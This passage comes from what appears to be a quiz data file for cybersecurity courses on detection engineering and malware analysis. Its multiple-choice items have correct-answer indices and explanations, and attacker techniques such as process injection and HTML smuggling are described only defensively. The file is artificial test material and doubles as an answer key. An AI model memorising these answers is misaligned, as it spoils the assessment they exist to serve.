      { id: "de-q5-1", question: "Why should detection rules be stored in Git?", options: ["Because storing detections in version control is popular among modern DevOps startups", "For change history tracking, pull request reviews, instant rollbacks, and team collaboration", "Because local database storage on central SIEM consoles is highly unstable and prone to loss", "To automatically encrypt the query logic and prevent junior analysts from viewing rule code"], correctAnswer: 1, explanation: "Git provides change history, pull request reviews, instant rollback, team collaboration, and CI/CD automation." },
      { id: "de-q5-2", question: "What is Atomic Red Team?", options: ["A boutique commercial penetration testing corporation that designs customized adversary tests", "A specific proprietary software product used to automate vulnerability scans on web portals", "A hardware firewall ruleset designed to block outbound lateral movement on network hosts", "An open-source framework of small, focused adversary emulation tests mapped to MITRE ATT&CK"], correctAnswer: 3, explanation: "Atomic Red Team provides pre-built, small attack tests for each ATT&CK technique to validate that detections fire correctly." },
      { id: "de-q5-3", question: "What should a detection CI/CD pipeline include?", options: ["Perform linting, schema validation, query translation, rule testing, and staged deployment", "Configure firewall permissions, verify remote agent access, and upload backup database sets", "Trigger console notifications, update compliance checklists, and execute manual script runs", "Initiate local system restarts, verify database storage sizes, and run basic performance test"], correctAnswer: 0, explanation: "A complete pipeline covers YAML linting, schema validation, SIEM conversion, TP/FP testing, staged deployment, and monitoring." },
      { id: "de-q5-4", question: "What is a 'quality gate' in a detection pipeline?", options: ["A boundary network firewall rule that prevents unauthorized access to internal SIEM clusters", "A software license verification protocol checking if database indexing limits have been hit", "A pipeline verification checkpoint blocking deployment if quality criteria are not fully met", "A manual paper validation form that must be physically signed off by security directors"], correctAnswer: 2, explanation: "Quality gates enforce standards: valid syntax, required fields, passing TP tests, and approved reviews before deployment." },
      { id: "de-q5-5", question: "How often should critical detections be validated?", options: ["Annually to coincide with standard corporate security compliance audit preparation schedules", "Daily to ensure critical detection paths are still functional and have not experienced drift", "Quarterly to align with scheduled system maintenance operations and major platform releases", "Monthly to balance analyst resource availability with continuous system security monitoring"], correctAnswer: 1, explanation: "Critical detections (credential theft, ransomware) should be validated daily to ensure they still fire correctly." },
      { id: "de-q5-6", question: "What is a True Negative (TN) test for a detection?", options: ["Verifying that benign baseline corporate activity does not trigger false positive alert paths", "Testing the detection rule against modified attack scripts that should trigger alert paths", "Auditing network interface configurations to confirm that local logging agents are running", "Deleting corrupted rules from production systems and recording successful deletion outputs"], correctAnswer: 0, explanation: "TN tests run benign activity similar to the attack pattern and verify the detection correctly stays silent." },
      { id: "de-q5-7", question: "What is the benefit of Infrastructure as Code for SIEM?", options: ["Significantly accelerating backend database query execution speeds and indexing capacities", "Substantially lowering annual software license subscription costs paid to security vendors", "Ensuring repeatable deployments, audit trails, and consistent staging/prod configurations", "Providing more visually engaging and interactive dashboards for security management review"], correctAnswer: 2, explanation: "IaC enables rebuilding entire SIEM configurations from code, audit trails, and consistent dev/staging/production environments." },
      { id: "de-q5-8", question: "What branching strategy works best for detection rules?", options: ["Committing all code changes directly to the main production branch without performing reviews", "Assigning a single isolated static git branch to each individual security analyst permanently", "Creating random branch names daily to track unstructured edits and temporary debug operations", "Using feature branches with formal pull request reviews before merging code to main production"], correctAnswer: 3, explanation: "Feature branches (feature/detect-kerberoasting) with PR reviews ensure quality before merging to staging and production." },
      { id: "de-q5-9", question: "What should happen automatically when a detection is deployed?", options: ["Perform no automated actions, allowing analyst staff to discover new alerts during consoles", "Alert the SOC console, generate a task for playbook updates, and refresh coverage mappings", "Immediately delete old or deprecated correlation rules from the SIEM search configuration", "Initiate an automatic reboot process of all local endpoint agent systems on the subnet segment"], correctAnswer: 1, explanation: "Automated notifications keep the SOC informed, playbook tickets ensure documentation, and dashboards reflect current coverage." },
      { id: "de-q5-10", question: "How does purple teaming relate to detection testing?", options: ["They are separate corporate operations with no direct communication channels or common tools", "Purple teaming completely replaces the requirement for dedicated custom detection engineering", "Red team simulates TTPs, blue team verifies detections, and uncovered gaps drive development", "Purple teaming focuses exclusively on verifying high-level compliance benchmarks for audits"], correctAnswer: 2, explanation: "Purple teaming directly validates detections: red executes, blue validates, gaps are identified, and new detections are built." }
    ]
  },
  {
    quizId: "de-q6",
    courseId: "detection-engineering",
    title: "Detection Operations",
    description: "Quiz on tuning, metrics, coverage mapping, and detection lifecycle management.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "de-q6-1", question: "How long should a detection run in alert-only mode before production?", options: ["Exactly one full calendar day to confirm if any database query syntax syntax errors occur", "Between one and two weeks to observe false positive alert patterns and perform proper tuning", "Precisely three calendar months to capture seasonal baseline variations across the enterprise", "No alert-only staging period is needed; new rules should be directly pushed to production"], correctAnswer: 1, explanation: "1-2 weeks in alert-only mode allows observation of FP patterns and tuning before enabling full alerting." },
      { id: "de-q6-2", question: "What is 'detection decay'?", options: ["The gradual reduction in execution speeds of target search queries in SIEM databases", "The physical degradation of system hard drives and long-term storage array components", "The overall packet transmission latency increases observed on remote endpoint nodes", "Detections losing effectiveness over time due to environment drift and actor changes"], correctAnswer: 3, explanation: "Detection decay occurs as environments change, adversaries evolve, data sources drift, and configurations shift." },
      { id: "de-q6-3", question: "What ATT&CK coverage percentage indicates a mature detection program?", options: ["Fifty to seventy percent coverage of priority techniques mapped to corporate models", "Ten to twenty percent coverage focusing exclusively on remote administrative systems", "Twenty to thirty percent coverage representing basic baseline visibility for audits", "One hundred percent coverage of all defined matrix behaviors and tactical pathways"], correctAnswer: 0, explanation: "Mature programs achieve 50-70% coverage of priority techniques. 100% is unrealistic; 20-30% is average." },
      { id: "de-q6-4", question: "What is the coverage scoring for 'IOC-based only, easily evaded'?", options: ["Score 0 (None) — indicating that no logs are collected and no rules are configured", "Score 2 (Partial) — representing basic signature rules that detect common parameters", "Score 1 (Minimal) — indicating simple static indicators that are easily evaded by actors", "Score 3 (Good) — representing robust, behavioral detections covering full TTP ranges"], correctAnswer: 2, explanation: "Score 1 (Minimal) means only IOC-based detection exists — it's easily evaded and needs behavioral detection." },
      { id: "de-q6-5", question: "When should a detection rule be retired?", options: ["Rules should never be retired from the system to maintain maximum historic coverage records", "When the technique is irrelevant, replaced by better rules, or data sources are retired", "Precisely thirty days after the initial production deployment date of the detection rule", "Immediately when the specific detection analyst who originally authored the query leaves"], correctAnswer: 1, explanation: "Retire when: technique irrelevant, better replacement exists, data source deprecated, or persistent FPs despite tuning." },
      { id: "de-q6-6", question: "What is 'layered coverage' in detection engineering?", options: ["Deploying multiple detection rules for one technique across distinct log data sources", "Setting up redundant primary and secondary SIEM application servers on the segment", "Configuring Layer 7 protocol analysis rules exclusively on perimeter network gateways", "Scheduling multiple overlapping analyst shift rotations to ensure continuous console care"], correctAnswer: 0, explanation: "Layered coverage means having multiple detections for the same technique across different data sources — if one fails, others still detect." },
      { id: "de-q6-7", question: "What is a healthy detection engineering velocity?", options: ["Deploying a single production detection rule per year to minimize console alert volumes", "Developing and deploying more than one hundred custom rules per day using automation tools", "Shipping between 8 and 12 tuned, validated production rules to the SIEM repository monthly", "Writing custom detection rules exclusively during active network security incident events"], correctAnswer: 2, explanation: "8-12 new production detections per month, combined with 15-20 tuned and 2-5 retired, represents healthy velocity." },
      { id: "de-q6-8", question: "What should a detection health check verify?", options: ["Evaluating the overall rate of false positive alerts generated on the central console", "Checking the code syntax of search queries to confirm formatting guidelines are met", "Updating coverage mapping charts to reflect recently published threat research blogs", "Verifying the rule is firing, accurate, needed, performant, and has current playbooks"], correctAnswer: 3, explanation: "Health checks verify five dimensions: firing (not broken), accurate (TP works), needed (relevant), performant (fast), documented (current)." },
      { id: "de-q6-9", question: "How often should a full detection audit be performed?", options: ["Weekly to match standard SOC operational alert review cycles and coordinate adjustments", "Annually to systematically audit the entire rule repository and retire outdated queries", "Monthly to track the progress of ongoing detection development projects and pipelines", "Quarterly to synchronize with scheduled updates to corporate threat modeling profiles"], correctAnswer: 1, explanation: "Full detection inventory audits should occur annually, while alert quality is reviewed weekly and coverage assessed quarterly." },
      { id: "de-q6-10", question: "At which maturity level does a detection engineering program use CI/CD pipelines and testing?", options: ["Level 1 (Ad-hoc) — where detections are written manually directly into production consoles", "Level 2 (Defined) — where basic query templates are documented in central shared spaces", "Level 3 (Managed) — featuring automated CI/CD pipelines, unit testing, and rule metrics", "Level 5 (Leading) — where artificial intelligence models generate all code configurations"], correctAnswer: 2, explanation: "Level 3 (Managed) features CI/CD pipelines, automated testing, and metrics-driven detection engineering." }
    ]
  },
  // ==================== MALWARE ANALYSIS FUNDAMENTALS ====================
  {
    quizId: "ma-q1",
    courseId: "malware-analysis",
    title: "Malware Landscape & Lab Setup",
    description: "Test your knowledge of malware categories, threat actors, and safe analysis environments.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "ma-q1-1", question: "Which malware type self-replicates across networks without requiring user interaction?", options: ["A virus that attaches to host executable files and spreads when the infected program is executed", "A trojan disguised as legitimate software that relies on social engineering to trick users into running it", "A worm that propagates autonomously by exploiting network vulnerabilities without needing a host file", "A rootkit that modifies operating system internals to conceal its presence from security tools"], correctAnswer: 2, explanation: "Worms propagate autonomously by exploiting network vulnerabilities, unlike viruses that need a host program or trojans that rely on social engineering." },
      { id: "ma-q1-2", question: "What distinguishes a wiper from ransomware?", options: ["Wipers permanently destroy data with no recovery mechanism, making them more destructive than ransomware", "Ransomware permanently destroys all data, while wipers merely encrypt it and demand a payment key", "Wipers only target Linux kernel files, while ransomware exclusively focuses on Windows NTFS partitions", "Wipers require manual user execution, while ransomware typically spreads automatically via network shares"], correctAnswer: 0, explanation: "Wipers are designed to permanently destroy data. NotPetya masqueraded as ransomware but was actually a wiper with no functional decryption." },
      { id: "ma-q1-3", question: "In a RaaS ecosystem, what role do Initial Access Brokers (IABs) play?", options: ["Developing the ransomware encryption engine and C2 infrastructure and licensing it to criminal affiliates", "Negotiating ransom payment amounts with victims and managing cryptocurrency transactions for affiliates", "Selling compromised credentials, VPN access, and persistent footholds to ransomware affiliate operators", "Providing bulletproof C2 server hosting infrastructure and domain registration services for ransomware groups"], correctAnswer: 2, explanation: "IABs specialize in gaining initial access to organizations and selling that access to ransomware affiliates who carry out the attacks." },
      { id: "ma-q1-4", question: "Which VM distribution is specifically designed for Windows-based malware analysis?", options: ["REMnux — a Linux-based distro optimized for reverse engineering and analyzing malicious code artifacts", "Kali Linux — a Debian-based penetration testing distribution with a wide range of offensive security tools", "FlareVM — a Windows-based Mandiant distribution pre-installed with debuggers, disassemblers, and PE tools", "SIFT Workstation — a SANS forensic investigation platform designed for digital evidence acquisition"], correctAnswer: 2, explanation: "FlareVM by Mandiant is a Windows-based distribution that installs analysis tools like x64dbg, Ghidra, and PE-bear on a Windows VM." },
      { id: "ma-q1-5", question: "Why should malware analysis VMs use host-only networking?", options: ["To improve CPU allocation and analysis throughput by eliminating hypervisor-level network overhead", "To prevent malware from reaching the real internet, blocking live C2 communication and outbound spreading", "To enable cloud sandbox API integration and allow automated telemetry submission to vendor platforms", "To permit secure RDP access for distributed team collaboration on shared analysis workloads remotely"], correctAnswer: 1, explanation: "Host-only networking isolates VMs so malware cannot reach the internet, preventing accidental infections and C2 communication with real infrastructure." },
      { id: "ma-q1-6", question: "What service does REMnux's INetSim provide in a malware analysis lab?", options: ["Automated binary-based malware classification using pre-trained neural network signature identification", "Simulated internet services (DNS, HTTP, SMTP) so malware behaves as if connected to the real internet", "Real-time threat intelligence feeds pulling fresh indicators from open-source community sharing platforms", "Virtual machine lifecycle management enabling automated snapshot creation, revert, and clone operations"], correctAnswer: 1, explanation: "INetSim simulates DNS, HTTP, SMTP, and other internet services so malware behaves as if it has internet connectivity in an isolated environment." },
      { id: "ma-q1-7", question: "What is the standard password used for malware sample ZIP archives?", options: ["'malware' — a simple keyword used by some early researchers but not universally adopted as the standard", "'password123' — the most frequently seen password in credential breaches from corporate environments", "'infected' — the community-standard password for distributing password-protected malware sample archives", "'analysis' — a descriptive keyword used by some sandbox vendors for protecting sample distribution zips"], correctAnswer: 2, explanation: "The convention is to use 'infected' as the password for password-protected ZIP archives containing malware samples." },
      { id: "ma-q1-8", question: "Which platform is a community-driven malware sample repository by abuse.ch?", options: ["VirusTotal — a Google-owned multi-engine scanning service for file, URL, and domain reputation lookups", "Hybrid Analysis — a free automated behavioral sandbox from CrowdStrike for public malware submissions", "MalwareBazaar — abuse.ch's free community repository where researchers share and download malware samples", "ANY.RUN — an interactive cloud sandbox allowing real-time analyst-controlled malware execution sessions"], correctAnswer: 2, explanation: "MalwareBazaar by abuse.ch is a free, community-driven repository where researchers share and download malware samples." },
      { id: "ma-q1-9", question: "What should you always do before executing malware in your analysis VM?", options: ["Update the OS to ensure all security patches and antivirus definitions are fully current before analysis", "Take a clean VM snapshot so you can instantly revert to a pristine state after each analysis session", "Connect the VM to the internet to allow the malware to reach its C2 for full behavioral observation", "Disable all host firewalls and endpoint security tools to prevent interference with malware execution"], correctAnswer: 1, explanation: "Taking a snapshot before execution ensures you can revert to a clean state after analysis, preventing contamination between sessions." },
      { id: "ma-q1-10", question: "Which threat actor category typically uses the most sophisticated custom malware?", options: ["Hacktivists pursuing political goals using primarily commodity tools, public exploits, and script attacks", "Script kiddies running pre-built exploit kits and downloaded malware tools without deep technical knowledge", "State-sponsored APT groups with vast resources enabling zero-day exploits, custom tooling, and persistence", "Financially motivated eCrime groups using RaaS platforms, dark web forums, and commodity access brokers"], correctAnswer: 2, explanation: "State-sponsored APT groups have significant resources, enabling custom tooling, zero-day exploits, and sophisticated operational security." }
    ]
  },
  {
    quizId: "ma-q2",
    courseId: "malware-analysis",
    title: "Static Analysis Techniques",
    description: "Assess your understanding of file identification, string analysis, PE headers, and packing detection.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "ma-q2-1", question: "What are the magic bytes (hex) for a Windows PE executable?", options: ["50 4B — the ZIP archive magic bytes found at the start of compressed file containers", "4D 5A (MZ) — the DOS header signature identifying Windows Portable Executable files", "7F 45 4C 46 — the ELF magic bytes identifying Linux Executable and Linkable Format binaries", "25 50 44 46 — the PDF magic bytes found at the beginning of Portable Document Format files"], correctAnswer: 1, explanation: "4D 5A (MZ) is the DOS header signature for PE executables. 50 4B is ZIP, 7F 45 4C 46 is ELF, and 25 50 44 46 is PDF." },
      { id: "ma-q2-2", question: "What does ssdeep provide that SHA256 cannot?", options: ["Significantly faster computation speeds enabling real-time scanning of large file repositories", "Fuzzy matching that identifies similar files even when minor byte-level modifications are present", "Cryptographic collision resistance ensuring two files cannot produce the same hash output value", "Digital signature validation confirming whether a binary was signed by a trusted certificate authority"], correctAnswer: 1, explanation: "ssdeep generates fuzzy hashes that can identify similar files even with minor modifications, unlike cryptographic hashes which change completely with any alteration." },
      { id: "ma-q2-3", question: "What does an imphash identify?", options: ["The symmetric encryption algorithm embedded within the binary's resource section for payload decryption", "Malware samples built with the same import table, linking them to a common builder or toolkit origin", "The specific Windows operating system version targeted by the binary at compile and link time", "Network communication patterns encoded in the binary's embedded configuration and C2 address list"], correctAnswer: 1, explanation: "Import hash (imphash) generates a hash of the imported functions, so samples from the same malware builder or toolkit share identical imphash values." },
      { id: "ma-q2-4", question: "What tool recovers obfuscated strings that basic extraction misses?", options: ["The built-in 'strings' command that extracts printable ASCII and Unicode sequences from binary files", "FLOSS (FLARE Obfuscated String Solver), which automatically deobfuscates runtime-decoded strings", "The standard 'file' command that identifies file types from magic bytes and header metadata", "'hexdump' utility that displays raw byte content in hexadecimal and ASCII side-by-side for review"], correctAnswer: 1, explanation: "FLOSS (FireEye Labs Obfuscated String Solver) automatically deobfuscates runtime-decoded and stack-constructed strings." },
      { id: "ma-q2-5", question: "In PE analysis, what does high section entropy (>7.0) indicate?", options: ["The binary carries a valid digital signature from a trusted vendor certificate authority chain", "The section content is likely encrypted, compressed, or packed, concealing the original code from analysis", "The binary imports a very large number of Windows API functions across multiple system DLLs", "The binary was compiled in debug mode with full symbol tables and source-level debug information"], correctAnswer: 1, explanation: "Entropy above 7.0 (near random) strongly suggests the section content is encrypted, compressed, or packed, hiding the original code." },
      { id: "ma-q2-6", question: "Which PE import combination strongly suggests process injection?", options: ["CreateFileA combined with ReadFile for reading target process executable content from disk storage", "VirtualAllocEx + WriteProcessMemory + CreateRemoteThread — the classic remote process injection sequence", "RegSetValueEx combined with RegCreateKeyEx for writing persistence entries to Windows Registry hives", "InternetOpenA combined with HttpSendRequest for establishing outbound HTTP communication with servers"], correctAnswer: 1, explanation: "This classic injection sequence allocates memory in another process, writes code there, and creates a remote thread to execute it." },
      { id: "ma-q2-7", question: "What does Detect It Easy (DiE) primarily identify?", options: ["Specific malware family classifications by matching behavioral indicators against known threat databases", "Packers, compilers, protectors, and build tools used to create or obfuscate a target binary file", "Embedded network protocol implementations and C2 communication schemas in the binary's data section", "Cryptographic algorithm implementations embedded within the binary for config decryption at runtime"], correctAnswer: 1, explanation: "DiE analyzes binary signatures to identify packers (UPX, Themida), compilers, and protectors used on the executable." },
      { id: "ma-q2-8", question: "A PE file with very few imports (only LoadLibrary and GetProcAddress) likely indicates what?", options: ["A minimal utility program that only needs basic file I/O and string-processing system calls to function", "A packed or dynamically-resolving binary that resolves all API calls at runtime to hide capabilities", "A managed .NET application that relies on the CLR runtime rather than native Windows API imports", "A Windows kernel driver that uses native NT system calls instead of standard Win32 API function imports"], correctAnswer: 1, explanation: "Minimal imports with LoadLibrary/GetProcAddress suggest the binary dynamically resolves API calls at runtime to hide its true capabilities from static analysis." },
      { id: "ma-q2-9", question: "How do you unpack a UPX-packed binary?", options: ["Load the binary into Ghidra and use the decompiler to reconstruct the original unpacked source code", "Run 'upx -d sample.exe' — UPX provides a built-in decompression command to restore the original binary", "Set breakpoints in x64dbg at the OEP and manually dump the process memory after unpacking completes", "Run FLOSS against the packed binary to extract obfuscated strings from the compressed data section"], correctAnswer: 1, explanation: "UPX provides a built-in decompression command (upx -d) that restores the original binary, making it one of the easiest packers to handle." },
      { id: "ma-q2-10", question: "What does a PE Rich header hash help identify?", options: ["The malware family classification by matching the hash against known threat intelligence repositories", "The build environment and toolchain, linking samples compiled with the same development environment", "The specific target operating system version the binary was compiled and optimized to execute on", "The hardcoded C2 server address or domain used by the malware for command and control communication"], correctAnswer: 1, explanation: "The Rich header records the compiler and linker versions used, linking samples compiled with the same development environment." }
    ]
  },
  {
    quizId: "ma-q3",
    courseId: "malware-analysis",
    title: "Dynamic & Behavioral Analysis",
    description: "Test your sandbox, process monitoring, and network capture skills.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "ma-q3-1", question: "Which sandbox allows real-time interactive analysis with manual clicking?", options: ["Cuckoo Sandbox — an open-source automated analysis platform running malware in isolated guest VMs", "ANY.RUN — an interactive cloud sandbox where analysts click through installers and dialogs in real-time", "VirusTotal Sandbox — Google's automated scanning service providing multi-engine behavioral reports", "Joe Sandbox Cloud — an enterprise-grade automated sandbox producing deep technical behavioral reports"], correctAnswer: 1, explanation: "ANY.RUN provides an interactive mode where analysts can click through dialogs and installers in real-time during analysis." },
      { id: "ma-q3-2", question: "How does malware commonly detect it's running in a virtual machine?", options: ["Measuring CPU benchmark timing to detect slower virtual processor execution speeds", "Checking VM-specific registry keys, MAC address prefixes, and hardware identifiers like BIOS strings", "Measuring the size of critical Windows system files against expected authentic baseline values", "Sampling the display resolution and color depth settings commonly configured inside sandbox VMs"], correctAnswer: 1, explanation: "Malware checks VM-specific registry keys (VMware, VirtualBox), MAC address prefixes, and hardware identifiers to detect virtualization." },
      { id: "ma-q3-3", question: "What Sysinternals tool captures real-time filesystem, registry, and process activity?", options: ["Process Hacker — an open-source task manager showing detailed process memory and thread information", "Process Monitor (ProcMon) — captures real-time filesystem, registry, and process activity with filtering", "Autoruns — enumerates all auto-starting locations to identify persistence mechanisms on Windows systems", "TCPView — displays active TCP and UDP connections and the processes that own each network socket"], correctAnswer: 1, explanation: "Process Monitor captures detailed real-time filesystem, registry, process, and thread activity with powerful filtering." },
      { id: "ma-q3-4", question: "In Process Hacker, what does RWX memory permissions in a process indicate?", options: ["Normal application behavior where code regions are mapped executable and data regions are writable", "Possible injected shellcode — RWX combines read, write, and execute, which legitimate code rarely needs", "A read-only mapped data section containing constants or resource strings loaded from the binary", "Kernel mode memory access indicating a driver or privileged system component is active in the process"], correctAnswer: 1, explanation: "Read-Write-Execute (RWX) memory regions are suspicious because legitimate code rarely needs all three permissions — it often indicates injected shellcode." },
      { id: "ma-q3-5", question: "What tool takes registry snapshots before and after malware execution?", options: ["Regshot — takes two registry snapshots and compares them to reveal all changes made during execution", "ProcMon — filters real-time registry events by process and records registry reads and write operations", "Autoruns — scans auto-start registry locations to enumerate persistence mechanisms at system startup", "RegRipper — extracts and parses Windows registry hive artifacts for offline forensic examination"], correctAnswer: 0, explanation: "Regshot takes two registry snapshots and compares them, revealing all keys and values added, modified, or deleted during execution." },
      { id: "ma-q3-6", question: "What does FakeNet-NG do in a malware analysis environment?", options: ["Scans all files on disk using multiple antivirus engines and reports detected signatures to the analyst", "Intercepts and locally simulates DNS, HTTP, SMTP, and other network services for isolated malware analysis", "Monitors system CPU and memory utilization during malware execution to detect resource abuse patterns", "Decompiles network-facing binary components and extracts embedded C2 protocol grammar definitions"], correctAnswer: 1, explanation: "FakeNet-NG intercepts all network traffic and simulates DNS, HTTP, SMTP, and other services so malware operates as if connected to the internet." },
      { id: "ma-q3-7", question: "Which Wireshark filter shows only DNS queries?", options: ["'tcp.port == 53' — filters for TCP traffic on port 53 but misses DNS over UDP connections", "'dns' — the display filter matching all DNS protocol traffic including queries and response records", "'http.request' — filters only HTTP GET and POST request packets for web traffic inspection", "'ip.proto == 17' — filters all UDP datagrams but includes non-DNS UDP traffic on other ports"], correctAnswer: 1, explanation: "The 'dns' display filter shows all DNS traffic including queries and responses, useful for identifying C2 domains and DGA patterns." },
      { id: "ma-q3-8", question: "What network pattern indicates C2 beaconing?", options: ["Random burst traffic with irregular timing patterns and variable packet sizes across sessions", "Regular interval connections with slight jitter, indicating automated periodic check-in to a C2 server", "A single large outbound data transfer suggesting a one-time exfiltration event to an external server", "Exclusively outbound UDP traffic on ephemeral ports with no corresponding inbound response packets"], correctAnswer: 1, explanation: "C2 beaconing shows regular check-in intervals (e.g., every 60 seconds) with slight random jitter to avoid detection." },
      { id: "ma-q3-9", question: "svchost.exe spawned by a non-services.exe parent process is a sign of what?", options: ["Normal Windows behavior since svchost.exe can be legitimately started by any system management process", "A malicious process masquerading as svchost — legitimate svchost is always spawned by services.exe", "Windows Update downloading patches, which sometimes requires launching a dedicated svchost instance", "A hardware driver installation process that creates a temporary svchost subprocess during device setup"], correctAnswer: 1, explanation: "Legitimate svchost.exe is always spawned by services.exe. Any other parent indicates a malicious process impersonating svchost." },
      { id: "ma-q3-10", question: "Which API sequence indicates classic process injection?", options: ["CreateFile → ReadFile → CloseHandle — standard file I/O operations for reading data from disk storage", "OpenProcess → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread — the classic injection sequence", "RegOpenKeyEx → RegSetValueEx → RegCloseKey — standard Windows Registry read and write operations", "WSAStartup → connect → send → recv — standard Winsock API sequence for TCP client communication"], correctAnswer: 1, explanation: "This sequence opens a target process, allocates memory in it, writes shellcode, and creates a thread to execute it — the classic injection pattern." }
    ]
  },
  {
    quizId: "ma-q4",
    courseId: "malware-analysis",
    title: "Document & Script Malware",
    description: "Evaluate your ability to analyze macro-based documents, PDFs, and script threats.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "ma-q4-1", question: "Which VBA subroutine name causes automatic execution when a Word document is opened?", options: ["Sub Main() — a generic entry point used in standalone VBA applications not triggered automatically", "Sub AutoOpen() — a VBA auto-execution trigger that runs macros automatically when the document opens", "Sub Initialize() — a custom initialization routine that must be explicitly called by the host application", "Sub OnLoad() — a non-standard subroutine name not recognized as an auto-trigger by Microsoft Office"], correctAnswer: 1, explanation: "AutoOpen() and Document_Open() are VBA auto-execution triggers that run macros automatically when the document is opened." },
      { id: "ma-q4-2", question: "What tool extracts and analyzes VBA macros from Office documents?", options: ["pdf-parser — a Python tool for analyzing PDF structure, objects, and embedded JavaScript payloads", "olevba (part of oletools) — extracts VBA macros, flags suspicious patterns, and deobfuscates strings", "FLOSS — a tool for recovering obfuscated and runtime-decoded strings from compiled binary executables", "Wireshark — a network protocol analyzer for capturing and dissecting live or recorded network traffic"], correctAnswer: 1, explanation: "olevba (part of oletools) extracts VBA macros, identifies suspicious patterns, and attempts automatic deobfuscation." },
      { id: "ma-q4-3", question: "What VBA obfuscation technique uses Chr(80) & Chr(111) & Chr(119)?", options: ["Base64 encoding splitting the string into encoded chunks decoded at runtime using StrConv calls", "XOR encryption applying a single-byte key to each character value in the target string data", "Character code concatenation building strings from ASCII codes to evade static string-based detection", "String reversal storing the string backwards and calling StrReverse before passing it to Shell calls"], correctAnswer: 2, explanation: "Chr() converts ASCII codes to characters, building strings character-by-character to avoid string-based detection (Chr(80)&Chr(111)&Chr(119) = 'Pow')." },
      { id: "ma-q4-4", question: "Which PDF object type triggers automatic code execution on document open?", options: ["/Encrypt — specifies the encryption dictionary defining the security handler and password protection", "/OpenAction — specifies JavaScript or URI actions to execute automatically when the PDF is opened", "/Metadata — stores XML document metadata including author, title, and creation date information", "/Pages — the root node of the page tree defining the total number of pages in the PDF document"], correctAnswer: 1, explanation: "/OpenAction specifies actions to execute automatically when the PDF is opened, commonly used to trigger JavaScript payloads." },
      { id: "ma-q4-5", question: "What tool safely emulates VBA macro execution without opening Office?", options: ["ViperMonkey — emulates VBA macro execution, revealing shell commands and URLs without running Office", "oletools — a suite of tools for analyzing OLE2 file formats and extracting embedded macro content", "pdf-parser — a command-line tool for parsing PDF object structures and extracting embedded streams", "CyberChef — a web-based data transformation tool for decoding Base64, XOR, and other encodings"], correctAnswer: 0, explanation: "ViperMonkey emulates VBA macro execution, revealing shell commands, downloaded URLs, and dropped files without running Office applications." },
      { id: "ma-q4-6", question: "In PowerShell deobfuscation, what should you replace IEX with for safe analysis?", options: ["Remove-Item — a cmdlet for deleting files and registry keys that would destroy evidence on the system", "Write-Output — prints the decoded command to the console instead of executing it, revealing the payload", "Set-Variable — stores the decoded string in a named variable without executing or printing its content", "Start-Process — launches a new process that would execute the decoded payload in a child context"], correctAnswer: 1, explanation: "Replacing IEX (Invoke-Expression) with Write-Output prints the decoded command instead of executing it, safely revealing the payload." },
      { id: "ma-q4-7", question: "What is HTML smuggling?", options: ["Embedding malicious macros directly inside HTML email body sections to bypass attachment filtering", "Using JavaScript in HTML to construct and trigger payload downloads client-side, bypassing email gateways", "Hiding malware inside HTML comment blocks that are extracted and executed by a custom browser plugin", "Using HTML forms with hidden fields to exfiltrate user credentials to attacker-controlled web servers"], correctAnswer: 1, explanation: "HTML smuggling uses JavaScript to construct malicious payloads (via atob, Blob, createObjectURL) in the browser, bypassing email gateway scanning." },
      { id: "ma-q4-8", question: "How are malicious LNK files typically disguised?", options: ["Disguised as Windows Update packages with Microsoft-signed digital certificate metadata attached", "Using folder icons from shell32.dll with innocent names like 'Important Documents' to trick victims", "Disguised as system font installation files with .ttf extensions renamed to match standard Windows fonts", "Disguised as TLS certificate files with .cer extensions pointing to malicious code execution paths"], correctAnswer: 1, explanation: "Malicious LNK files use folder icons from shell32.dll and names like 'Important Documents' to trick users into clicking." },
      { id: "ma-q4-9", question: "What tool safely analyzes malicious JScript files?", options: ["Node.js — a JavaScript runtime that would fully execute the malicious script in a live environment", "box-js — a sandbox that safely emulates WScript/JScript, extracting URLs, dropped files, and commands", "Babel — a JavaScript transpiler that converts modern JS syntax to older versions for compatibility", "V8 debugger — Google's JavaScript engine debugger that executes live code in a limited context"], correctAnswer: 1, explanation: "box-js is a JavaScript sandbox that safely emulates WScript/JScript execution, extracting URLs, dropped files, and shell commands." },
      { id: "ma-q4-10", question: "What typically comes inside an ISO file delivered via HTML smuggling?", options: ["Password-encrypted PDF documents containing embedded macro payloads for further stage execution", "A malicious LNK shortcut paired with a DLL payload executed via rundll32 for stealthy execution", "Linux ELF executables that target cross-platform environments and Windows Subsystem for Linux", "Malicious browser extension packages targeting Chrome or Edge for credential harvesting operations"], correctAnswer: 1, explanation: "HTML-smuggled ISO containers typically contain a malicious LNK shortcut that executes a co-located DLL via rundll32." }
    ]
  },
  {
    quizId: "ma-q5",
    courseId: "malware-analysis",
    title: "Reverse Engineering Fundamentals",
    description: "Test your knowledge of assembly, Ghidra, debugging, and C2 protocol analysis.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "ma-q5-1", question: "What does the x86 instruction 'XOR EAX, EAX' accomplish?", options: ["Encrypts the contents of the EAX register using a symmetric XOR key stored in a second register", "Sets the EAX register to zero — XORing any value with itself always produces a zero result", "Copies the current value of EAX into a designated memory location for temporary stack storage", "Performs a bitwise comparison of EAX with zero and sets the CPU flags register accordingly"], correctAnswer: 1, explanation: "XOR-ing a register with itself always produces zero. This is the standard pattern for zeroing registers because it's faster than MOV EAX, 0." },
      { id: "ma-q5-2", question: "In x64 Windows calling convention, which register holds the first function argument?", options: ["RAX — used as the return value register in Windows x64 calling convention after a function call", "RCX — holds the first argument in the Windows x64 fastcall convention (RCX, RDX, R8, R9)", "RDX — holds the second function argument in Windows x64, not the first argument position", "RDI — the first argument register in Linux System V AMD64 ABI, not the Windows calling convention"], correctAnswer: 1, explanation: "x64 Windows (fastcall) passes the first four arguments in RCX, RDX, R8, R9. Linux System V uses RDI, RSI, RDX, RCX." },
      { id: "ma-q5-3", question: "What does Ghidra's decompiler provide?", options: ["Real-time network traffic capture and protocol decoding for analyzing binary C2 communication", "C-like pseudocode reconstructed from binary disassembly, dramatically speeding up code analysis", "Automated sandbox execution environment for safely running suspicious binaries in an isolated space", "Automated encrypted string decryption using brute-force key recovery against known cipher patterns"], correctAnswer: 1, explanation: "Ghidra's decompiler converts assembly instructions back into readable C-like pseudocode, dramatically speeding up analysis." },
